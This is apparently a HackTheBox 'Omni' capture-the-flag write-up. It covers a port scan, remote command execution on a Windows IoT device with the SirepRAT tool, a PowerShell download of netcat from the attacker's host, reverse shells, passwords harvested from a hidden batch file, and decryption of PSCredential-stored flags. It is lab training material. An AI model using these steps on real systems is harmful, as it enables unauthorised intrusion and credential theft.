# HackTheBox-Omni

## NMAP

```
Host is up (0.21s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
29820/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port29820-TCP:V=7.80%I=7%D=11/16%Time=5FB29B69%P=x86_64-pc-linux-gnu%r(
SF:NULL,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(GenericLines,10,
SF:"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(Help,10,"\*LY\xa5\xfb`\x
SF:04G\xa9m\x1c\xc9}\xc8O\x12")%r(JavaRMI,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\
SF:xc9}\xc8O\x12");
Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 355.84 seconds

```

## PORT 8080

<img src="https://imgur.com/t5dBZhD.png"/>

The site was asking me for credentials , I tried to goolge deafult password for `Windows Device Portal`


User Name :Administrator
password  :p@ssw0rd

But these credentials didn't work that I found on google


<img src="https://imgur.com/Vxpm1PC.png"/>

Then I came to know that this is an IoT box also I found a repository on GitHub which is a script that acts as RAT (Remote Access Trojan)

<img src="https://imgur.com/IJPzGDR.png"/>

https://github.com/SafeBreach-Labs/SirepRAT

I tried running commands that were on the repository so basically you want to install `hexdump` module on python2 because these works with python2 

<img src="https://imgur.com/sWYbCPF.png"/>


<img src="https://imgur.com/ik4yaSG.png"/>

So our RAT is working perfectly!

Now let's try to craft a backdoor to get a reverse shell and start metasploit listener 

<img src="https://imgur.com/bb6JZpQ.png"/>

But this didn't worked 

<img src="https://imgur.com/OEEO6Je.png"/>

Let's try to upload a `netcat` binary by hosting on our local machine and using `powershell Invoke-WebRequest -Uri $ip -OutFile $filepath`

<img src="https://imgur.com/yNrOwo0.png"/>

So it did it get transfered on the target box

<img src="https://imgur.com/RWM1K1d.png"/>

Looks like this version of `netcat` is not compatible , I then again tried to upload `netcat64.exe` and we got a hit 

<img src="https://imgur.com/KSuEEJV.png"/>

So let's keep our fingers crossed and hope we get a reverse shell

<img src="https://imgur.com/1ikwQsr.png"/>

And we got it :D

<img src="https://imgur.com/52p0i4q.png"/>

Here we can see there are 3 drives and we are in `C` drive where as in `D` drive we can see the `app` and `administrator` folder but we are not able to access them and `D` drive is formatted correctly so we cannot access it

By using `dir /a` we can see the hidden folder although we could have used powershell and used `ls -la` but this still gets our job done so when reading the contents of `r.bat ` we can two users as we suspected and what `net user ` is doing is that changing the password of both the users also it is also deleting that account in a loop

<img src="https://imgur.com/NNdZnM3.png"/>

```
net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz
```

So I think we could not switch users as we do in linux atleast I don't know how to do it I tried googling in pasting the commands but didn't work so I assumed that this would be the password for that `Windows Device Portal` that we saw in the beginning .

<img src="https://imgur.com/p6Prnng.png"/>

So once I got into the application I looked around that what can I do with it and found where I can run system commands

<img src="https://imgur.com/Dbdob1n.png"/>

Now to see that which user are we , I tried ruuning `whoami` it failed but when I ran `echo %username%` it showed me that I'm Administrator so let's find a way to get a shell from here

<img src="https://imgur.com/c3nb2om.png"/>

Now we already uploaded `nc64.exe` in `C:\Windows\Temp` 

<img src="https://imgur.com/GJEdxsd.png"/>

<img src="https://imgur.com/KMFULV4.png"/>

Now we can't really read the contents of `user.txt` and `root.txt` because they are stored as an credential object in powershell which is called `PSCredential Object`

Now inorder to decrypt `user.txt` we need to be logged in as ther user in which that file `user.txt` in and for `root.txt` we need to be an administrator so we are admintrator let's try to decrypt that flag for now and then we will switch to `app` user


First we create an object in which that file is stored

`$file = Import-Clixml -Path U:\Users\administrator\root.txt`

Then if it gives no errors this command ran sucessfully

`$file.GetNetworkCredential().password`

Then this would use this an object to call a function to grab the password

<img src="https://imgur.com/gpenN2p.png"/>

Now for `app` user I'm going to quickly log in as him through `Windows Device Portal` run the netcat binary and caputre the reverse shell

Inorder to do that since there was no `logout` option on that portal I had to clear all browser's data then logged in with the password that we found for `app`

<img src="https://imgur.com/aNJpqUs.png"/>

I tried ruuning the `nc64.exe` binary but it was giving accessed denied so there was `Public` directory in `C` drive I uploaded the binary there

<img src="https://imgur.com/LgCK6Ni.png"/>

<img src="https://imgur.com/z7ZCtDH.png"/>

And we have a shell as `app` finally 

<img src="https://imgur.com/5iybuaf.png"/>

And we got the user flag as well

This link was really helpful for me to decrypt the password or in this case flag `https://www.travisgan.com/2015/06/powershell-password-encryption.html`
